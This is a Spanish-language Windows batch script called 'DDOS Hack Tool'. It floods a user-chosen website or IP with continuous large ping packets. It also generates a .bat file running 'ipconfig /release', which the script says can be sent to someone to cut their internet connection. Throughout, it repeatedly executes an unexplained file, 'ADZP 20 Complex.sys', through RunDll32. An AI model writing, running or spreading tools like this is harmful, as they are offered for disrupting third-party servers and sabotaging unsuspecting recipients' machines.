@echo off
title DDOS Hack Tool
:Verificacion
color a
cd SystemDDOS >nul
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc0) >nul
goto Inicio

:Error0x0cc0
cls
color f
echo( Error
echo( DDOS Hack Tool no ha arrancado porque
echo( El Siguiente Arcvhivo Falta o esta
echo( Corrupto: ADZP 20 Complex.sys
echo( =====================================
echo( Reinstale una Copia de el Archivo
echo( Mencionado y vuelva a intentar
pause >nul
exit

:Error0x0cc20
cls
color f
echo.
echo.
echo.
echo.
echo.
echo                                                           !
echo.
echo                                      El Programa se ha Cerrado Debido a un Error
echo.
pause >nul
exit

:Inicio
cls
color a
echo(
echo(
echo(            ==========================================================================================
echo(                              DDOS Hack Tool                                                          
echo(            =================================================== 1 = Ataque a una Pagina web           
echo(                      Bienvenido, Con esta Herramienta          2 = Anular la Conexion de Internet en 
echo(                      Puede Realizar Ataques DDOS a un              un Dispositivo                    
echo(                      Servidor con un Maximo de 65500           3 = Ver Configuracion de la Red       
echo(                      Bytes por Segundo.                                                              
echo(            ==========================================================================================
set /p id= *           Ingrese la ID: 
if %id% == 1 (goto DDOS)
if %id% == 2 (goto EthernetKiller)
if %id% == 3 (goto IpConfig)

:DDOS
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
echo.
set /p ip= Ingrese la IP o URL de el Sitio web que quiere atacar: 
echo.
echo.
set /p bytes= Ingrese la Cantidad de Bytes con la que Quiere Atacar la Web: 
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo. ===============================
echo.  Preparando Ataque DDOS...     
echo. ===============================
timeout /t 3 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.  Preparando Paquetes...        
echo. ===============================
timeout /t 3 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.  Conectando con el Servidor... 
echo. ===============================
ping %ip% -n 4 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
IF NOT ERRORLEVEL 1 GOTO ATTACK >nul
goto Error0x0cc18

:Attack
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo =========================================
echo  Atacando a %ip%...
echo =========================================
echo  Para Detener el Ataque DDOS al Sitio
echo  Web presione Control + C y se Detendran
echo  Todos los Procesos de Ataque.
echo =========================================
ping %ip% -t -l %bytes%
goto Inicio

:Error0x0cc18
cls
echo.
echo. =============================================
echo.   No se Puede Establecer Conexion para poder 
echo.   Realizar el Ataque DDOS                    
echo. =============================================
echo.            Verifique lo Siguiente            
echo. =============================================
echo.  * Si hay Conexion a Internet                
echo. =============================================
echo.  * Que un Cortafuegos no este Bloqueando la  
echo.    Conexion a Internet                       
echo. =============================================
pause >nul
exit

:EthernetKiller
cls
echo.
echo.
echo.
echo.
set /p name= Antes de crear el Archivo Ingrese el Nombre que quiere Asignarle: 
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo @echo off>>%name%.bat
echo Ipconfig /release>>%name%.bat
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
echo.
echo.
echo.    Se Acaba de Crear un Archivo que anula el Internet, Puede Enviar este Archivo a alguien para anular su Conexion
echo.                                                  a Internet
pause >nul
goto Inicio

:IpConfig
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
ipconfig
pause >nul
goto Inicio